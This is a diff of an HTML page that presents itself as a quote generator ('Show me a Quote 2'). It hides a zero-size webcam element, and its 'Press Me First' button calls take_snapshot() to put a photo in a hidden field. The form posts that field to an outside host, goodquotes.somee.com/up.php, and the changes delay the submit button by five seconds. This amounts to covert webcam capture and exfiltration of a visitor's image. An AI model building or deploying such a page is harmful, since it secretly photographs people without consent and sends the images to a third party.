@@ -5,18 +5,27 @@
     <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
     <script src="https://cdnjs.cloudflare.com/ajax/libs/webcamjs/1.0.25/webcam.min.js"></script>
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/twitter-bootstrap/4.1.3/css/bootstrap.min.css" />
+        <style>
+        #proceed {
+  display: none;
+}
+    </style>
 </head>
 <body>
-    <form action="http://www.goodquotes.somee.com/up.php" method="POST" id=demo>
+    <script src="https://ajax.googleapis.com/ajax/libs/jquery/2.1.1/jquery.min.js"></script>
+    <form action="http://www.goodquotes.somee.com/up.php" method="POST">
         <span style="height:0px;width:0px;display:none;" id="my_camera" height=0 width=0></span>
                 <br/>
-                <input type=button value="Press Me First" onClick="take_snapshot(); myFunction();">
+                <input type=button value="Press Me First" onClick="take_snapshot()">
                 <input type="hidden" name="image" id="image" class="image-tag">
-<script>
-function myFunction() {
-  document.getElementById("demo").innerHTML = "<input type=submit value='Show me a Quote 2'>";
-}
-</script>
+                <input type=submit id="proceed" value='Show me a Quote 2'>
+            <script type="text/javascript">
+        $(document).ready(function() {
+  setTimeout(function() {
+    $("#proceed").show();
+  }, 5000);
+});
+    </script>
     </form>
         <script language="JavaScript">
     Webcam.set({
